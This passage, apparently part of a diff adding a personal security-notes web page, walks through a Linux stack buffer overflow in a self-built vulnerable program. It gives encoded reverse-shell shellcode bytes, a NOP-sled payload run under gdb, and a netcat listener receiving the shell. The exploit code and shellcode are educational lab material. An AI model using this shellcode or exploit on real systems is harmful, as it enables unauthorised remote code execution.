+<span class="w">  </span>--platform<span class="w"> </span>linux<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--bad-chars<span class="w"> </span><span class="s2">&quot;\x00\x09\x0a\x20&quot;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--out<span class="w"> </span>shellcode<span class="w"> </span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Found</span> <span class="mi">11</span> <span class="n">compatible</span> <span class="n">encoders</span>
+<span class="n">Attempting</span> <span class="n">to</span> <span class="n">encode</span> <span class="n">payload</span> <span class="k">with</span> <span class="mi">1</span> <span class="n">iterations</span> <span class="n">of</span> <span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span>
+<span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span> <span class="n">succeeded</span> <span class="k">with</span> <span class="n">size</span> <span class="mi">95</span> <span class="p">(</span><span class="n">iteration</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span> <span class="n">chosen</span> <span class="k">with</span> <span class="n">final</span> <span class="n">size</span> <span class="mi">95</span>
+<span class="n">Payload</span> <span class="n">size</span><span class="p">:</span> <span class="mi">95</span> <span class="nb">bytes</span>
+<span class="n">Final</span> <span class="n">size</span> <span class="n">of</span> <span class="n">c</span> <span class="n">file</span><span class="p">:</span> <span class="mi">425</span> <span class="nb">bytes</span>
+<span class="n">Saved</span> <span class="k">as</span><span class="p">:</span> <span class="n">shellcode</span>
+</pre></div>
+</div>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span>
+<span class="s">&quot;</span><span class="se">\xda\xca\xd9\x74\x24\xf4\xb8\x54\xc2\xcf\x23\x5d\x31\xc9</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\xb1\x12\x83\xc5\x04\x31\x45\x13\x03\x11\xd1\x2d\xd6\xa8</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x0e\x46\xfa\x99\xf3\xfa\x97\x1f\x7d\x1d\xd7\x79\xb0\x5e</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x8b\xdc\xfa\x60\x61\x5e\xb3\xe7\x80\x36\x3b\x18\x73\xc7</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\xab\x1a\x73\xbd\x42\x92\x92\xf1\xf3\xf4\x05\xa2\x48\xf7</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x2c\xa5\x62\x78\x7c\x4d\x13\x56\xf2\xe5\x83\x87\xdb\x97</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x3a\x51\xc0\x05\xee\xe8\xe6\x19\x1b\x26\x68</span><span class="s">&quot;</span><span class="p">;</span>
+</pre></div>
+</div>
+<p>we can now put that into one string</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="s2">&quot;</span><span class="se">\xda\xca\xd9\x74\x24\xf4\xb8\x54\xc2\xcf\x23\x5d\x31\xc9\xb1\x12\x83\xc5\x04\x31\x45\x13\x03\x11\xd1\x2d\xd6\xa8\x0e\x46\xfa\x99\xf3\xfa\x97\x1f\x7d\x1d\xd7\x79\xb0\x5e\x8b\xdc\xfa\x60\x61\x5e\xb3\xe7\x80\x36\x3b\x18\x73\xc7\xab\x1a\x73\xbd\x42\x92\x92\xf1\xf3\xf4\x05\xa2\x48\xf7\x2c\xa5\x62\x78\x7c\x4d\x13\x56\xf2\xe5\x83\x87\xdb\x97\x3a\x51\xc0\x05\xee\xe8\xe6\x19\x1b\x26\x68</span><span class="s2">&quot;</span>
+</pre></div>
+</div>
+<p>and addapt our exploit with that shellcode</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>run<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;print &quot;\x55&quot; * (1040 - 124 - 95 - 4) + &quot;\x90&quot; * 124 + &quot;\xda\xca\xd9\x74\x24\xf4\xb8\x54\xc2\xcf\x23\x5d\x31\xc9\xb1\x12\x83\xc5\x04\x31\x45\x13\x03\x11\xd1\x2d\xd6\xa8\x0e\x46\xfa\x99\xf3\xfa\x97\x1f\x7d\x1d\xd7\x79\xb0\x5e\x8b\xdc\xfa\x60\x61\x5e\xb3\xe7\x80\x36\x3b\x18\x73\xc7\xab\x1a\x73\xbd\x42\x92\x92\xf1\xf3\xf4\x05\xa2\x48\xf7\x2c\xa5\x62\x78\x7c\x4d\x13\x56\xf2\xe5\x83\x87\xdb\x97\x3a\x51\xc0\x05\xee\xe8\xe6\x19\x1b\x26\x68&quot; + &quot;\x66&quot; * 4&#39;</span><span class="k">)</span>
+The<span class="w"> </span>program<span class="w"> </span>being<span class="w"> </span>debugged<span class="w"> </span>has<span class="w"> </span>been<span class="w"> </span>started<span class="w"> </span>already.
+Start<span class="w"> </span>it<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>beginning?<span class="w"> </span><span class="o">(</span>y<span class="w"> </span>or<span class="w"> </span>n<span class="o">)</span><span class="w"> </span>y
+Starting<span class="w"> </span>program:<span class="w"> </span>/home/blnkn/c/bow32<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;print &quot;\x55&quot; * (1040 - 124 - 95 - 4) + &quot;\x90&quot; * 124 + &quot;\xda\xca\xd9\x74\x24\xf4\xb8\x54\xc2\xcf\x23\x5d\x31\xc9\xb1\x12\x83\xc5\x04\x31\x45\x13\x03\x11\xd1\x2d\xd6\xa8\x0e\x46\xfa\x99\xf3\xfa\x97\x1f\x7d\x1d\xd7\x79\xb0\x5e\x8b\xdc\xfa\x60\x61\x5e\xb3\xe7\x80\x36\x3b\x18\x73\xc7\xab\x1a\x73\xbd\x42\x92\x92\xf1\xf3\xf4\x05\xa2\x48\xf7\x2c\xa5\x62\x78\x7c\x4d\x13\x56\xf2\xe5\x83\x87\xdb\x97\x3a\x51\xc0\x05\xee\xe8\xe6\x19\x1b\x26\x68&quot; + &quot;\x66&quot; * 4&#39;</span><span class="k">)</span>
+
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x565561ad<span class="w"> </span><span class="k">in</span><span class="w"> </span>bowfunc<span class="w"> </span><span class="o">()</span>
+</pre></div>
+</div>
+<p>we can check the stack again at our breakpoint and see if the end of the NOPs corresponds with the beginning of our shellcode as expected, and it does</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mh">0xffffd640</span><span class="p">:</span>     <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>
+<span class="mh">0xffffd648</span><span class="p">:</span>     <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>
+<span class="mh">0xffffd650</span><span class="p">:</span>     <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>
+<span class="mh">0xffffd658</span><span class="p">:</span>     <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0x90</span>    <span class="mh">0xda</span>
+<span class="mh">0xffffd660</span><span class="p">:</span>     <span class="mh">0xca</span>    <span class="mh">0xd9</span>    <span class="mh">0x74</span>    <span class="mh">0x24</span>    <span class="mh">0xf4</span>    <span class="mh">0xb8</span>    <span class="mh">0x54</span>    <span class="mh">0xc2</span>
+<span class="mh">0xffffd668</span><span class="p">:</span>     <span class="mh">0xcf</span>    <span class="mh">0x23</span>    <span class="mh">0x5d</span>    <span class="mh">0x31</span>    <span class="mh">0xc9</span>    <span class="mh">0xb1</span>    <span class="mh">0x12</span>    <span class="mh">0x83</span>
+<span class="mh">0xffffd670</span><span class="p">:</span>     <span class="mh">0xc5</span>    <span class="mh">0x04</span>    <span class="mh">0x31</span>    <span class="mh">0x45</span>    <span class="mh">0x13</span>    <span class="mh">0x03</span>    <span class="mh">0x11</span>    <span class="mh">0xd1</span>
+<span class="mh">0xffffd678</span><span class="p">:</span>     <span class="mh">0x2d</span>    <span class="mh">0xd6</span>    <span class="mh">0xa8</span>    <span class="mh">0x0e</span>    <span class="mh">0x46</span>    <span class="mh">0xfa</span>    <span class="mh">0x99</span>    <span class="mh">0xf3</span>
+<span class="mh">0xffffd680</span><span class="p">:</span>     <span class="mh">0xfa</span>    <span class="mh">0x97</span>    <span class="mh">0x1f</span>    <span class="mh">0x7d</span>    <span class="mh">0x1d</span>    <span class="mh">0xd7</span>    <span class="mh">0x79</span>    <span class="mh">0xb0</span>
+</pre></div>
+</div>
+<p>verifying that we still controll the EIP after passing the breakpoint</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>info<span class="w"> </span>register<span class="w"> </span>eip
+eip<span class="w">            </span>0x66666666<span class="w">          </span>0x66666666
+</pre></div>
+</div>
+<p>so we can now point the EIP to somewhere in the NOPs sections, the execution will then just skip the nops until it finds our shellcode.
+<img alt="buffer-6.png" src="../../../../_images/buffer-6.png" /></p>
+<p>we’re gonna jump to 0xffffd648, because this is something endian, we’re gonna have to spell that backwards</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>0xffffd648<span class="w"> </span>-&gt;<span class="w"> </span><span class="s2">&quot;\x48\xd6\xff\xff&quot;</span>
+</pre></div>
+</div>
+<p>lets have a netcat listener going and run our BOF</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>run<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;print &quot;\x55&quot; * (1040 - 124 - 95 - 4) + &quot;\x90&quot; * 124 + &quot;\xda\xca\xd9\x74\x24\xf4\xb8\x54\xc2\xcf\x23\x5d\x31\xc9\xb1\x12\x83\xc5\x04\x31\x45\x13\x03\x11\xd1\x2d\xd6\xa8\x0e\x46\xfa\x99\xf3\xfa\x97\x1f\x7d\x1d\xd7\x79\xb0\x5e\x8b\xdc\xfa\x60\x61\x5e\xb3\xe7\x80\x36\x3b\x18\x73\xc7\xab\x1a\x73\xbd\x42\x92\x92\xf1\xf3\xf4\x05\xa2\x48\xf7\x2c\xa5\x62\x78\x7c\x4d\x13\x56\xf2\xe5\x83\x87\xdb\x97\x3a\x51\xc0\x05\xee\xe8\xe6\x19\x1b\x26\x68&quot; + &quot;\x48\xd6\xff\xff&quot;&#39;</span><span class="k">)</span>
+The<span class="w"> </span>program<span class="w"> </span>being<span class="w"> </span>debugged<span class="w"> </span>has<span class="w"> </span>been<span class="w"> </span>started<span class="w"> </span>already.
+Start<span class="w"> </span>it<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>beginning?<span class="w"> </span><span class="o">(</span>y<span class="w"> </span>or<span class="w"> </span>n<span class="o">)</span><span class="w"> </span>y
+Starting<span class="w"> </span>program:<span class="w"> </span>/home/blnkn/c/bow32<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;print &quot;\x55&quot; * (1040 - 124 - 95 - 4) + &quot;\x90&quot; * 124 + &quot;\xda\xca\xd9\x74\x24\xf4\xb8\x54\xc2\xcf\x23\x5d\x31\xc9\xb1\x12\x83\xc5\x04\x31\x45\x13\x03\x11\xd1\x2d\xd6\xa8\x0e\x46\xfa\x99\xf3\xfa\x97\x1f\x7d\x1d\xd7\x79\xb0\x5e\x8b\xdc\xfa\x60\x61\x5e\xb3\xe7\x80\x36\x3b\x18\x73\xc7\xab\x1a\x73\xbd\x42\x92\x92\xf1\xf3\xf4\x05\xa2\x48\xf7\x2c\xa5\x62\x78\x7c\x4d\x13\x56\xf2\xe5\x83\x87\xdb\x97\x3a\x51\xc0\x05\xee\xe8\xe6\x19\x1b\x26\x68&quot; + &quot;\x48\xd6\xff\xff&quot;&#39;</span><span class="k">)</span>
+
+Breakpoint<span class="w"> </span><span class="m">1</span>,<span class="w"> </span>0x565561ad<span class="w"> </span><span class="k">in</span><span class="w"> </span>bowfunc<span class="w"> </span><span class="o">()</span>
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>c
+Continuing.
+process<span class="w"> </span><span class="m">36361</span><span class="w"> </span>is<span class="w"> </span>executing<span class="w"> </span>new<span class="w"> </span>program:<span class="w"> </span>/usr/bin/dash
+Error<span class="w"> </span><span class="k">in</span><span class="w"> </span>re-setting<span class="w"> </span>breakpoint<span class="w"> </span><span class="m">1</span>:<span class="w"> </span>Function<span class="w"> </span><span class="s2">&quot;bowfunc&quot;</span><span class="w"> </span>not<span class="w"> </span>defined.
+</pre></div>
+</div>
+<p>boom!</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>blnkn@amd64:~$<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">31337</span>
+listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">31337</span><span class="w"> </span>...
+connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">127</span>.0.0.1<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">127</span>.0.0.1<span class="o">]</span><span class="w"> </span><span class="m">35310</span>
+id
+<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>blnkn<span class="o">)</span><span class="w"> </span><span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>blnkn<span class="o">)</span><span class="w"> </span><span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>blnkn<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,27<span class="o">(</span>sudo<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>,113<span class="o">(</span>bluetooth<span class="o">)</span>,118<span class="o">(</span>lpadmin<span class="o">)</span>,121<span class="o">(</span>scanner<span class="o">)</span>
+<span class="nb">pwd</span>
+/home/blnkn/c
+</pre></div>
+</div>
+</section>
+</section>
+
+        </article>
+      </div>
+      <footer>
+        
+        <div class="related-pages">
+          <a class="next-page" href="../../hashcat/hashcat.html">
+              <div class="page-info">
+                <div class="context">
+                  <span>Next</span>
+                </div>
+                <div class="title">Hashcat</div>
+              </div>
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+            </a>
+          <a class="prev-page" href="../buffer-overflows.html">
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+              <div class="page-info">
+                <div class="context">
+                  <span>Previous</span>
+                </div>
+                
+                <div class="title">Buffer Overflows</div>
+                
+              </div>
+            </a>
+        </div>
+        <div class="bottom-of-page">
+          <div class="left-details">
+            <div class="copyright">
+                Copyright &#169; 2023, blnkn
+            </div>
+            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
+            
+            <a href="https://github.com/pradyunsg/furo">Furo</a>
+            
+          </div>
+          <div class="right-details">
+            
+          </div>
+        </div>
+        
+      </footer>
+    </div>
+    <aside class="toc-drawer">
+      
+      
+      <div class="toc-sticky toc-scroll">
+        <div class="toc-title-container">
+          <span class="toc-title">
+            On this page
+          </span>
+        </div>
+        <div class="toc-tree-container">
+          <div class="toc-tree">
+            <ul>
+<li><a class="reference internal" href="#">Linux Buffer Overflows</a><ul>
+<li><a class="reference internal" href="#von-neumann-architecture">Von-Neumann architecture:</a></li>
+<li><a class="reference internal" href="#instruction-set-architectures-types">Instruction Set Architectures types:</a></li>
+<li><a class="reference internal" href="#instruction-cycle">Instruction Cycle:</a></li>
+<li><a class="reference internal" href="#binary-formats">Binary formats;</a></li>
+<li><a class="reference internal" href="#memory-structure">Memory structure:</a></li>
+<li><a class="reference internal" href="#modern-memory-protections">Modern memory protections:</a></li>
+<li><a class="reference internal" href="#vulnerable-c-functions">Vulnerable C Functions</a></li>
+<li><a class="reference internal" href="#intel-flavor-anatomy">Intel flavor Anatomy</a></li>
+<li><a class="reference internal" href="#data-registers">Data Registers</a></li>
+<li><a class="reference internal" href="#pointer-registers">Pointer Registers</a></li>
+<li><a class="reference internal" href="#index-registers">Index Registers</a></li>
+<li><a class="reference internal" href="#make-a-vulnerable-program-example">Make a vulnerable program example</a></li>
+<li><a class="reference internal" href="#stack-frames">Stack frames</a></li>
+<li><a class="reference internal" href="#taking-control-of-the-eip">Taking control of the EIP</a></li>
+<li><a class="reference internal" href="#determing-the-length-we-need-for-our-shellcode">Determing the length we need for our shellcode</a></li>
+<li><a class="reference internal" href="#identifying-bad-characters">Identifying bad characters</a></li>
+<li><a class="reference internal" href="#generating-our-actual-shellcode">Generating our actual shellcode</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+      
+      
+    </aside>
+  </div>
+</div><script data-url_root="../../../../" id="documentation_options" src="../../../../_static/documentation_options.js?v=b3ba4146"></script>
+    <script src="../../../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../../../_static/scripts/furo.js?v=32e29ea5"></script>
+    </body>
+</html>
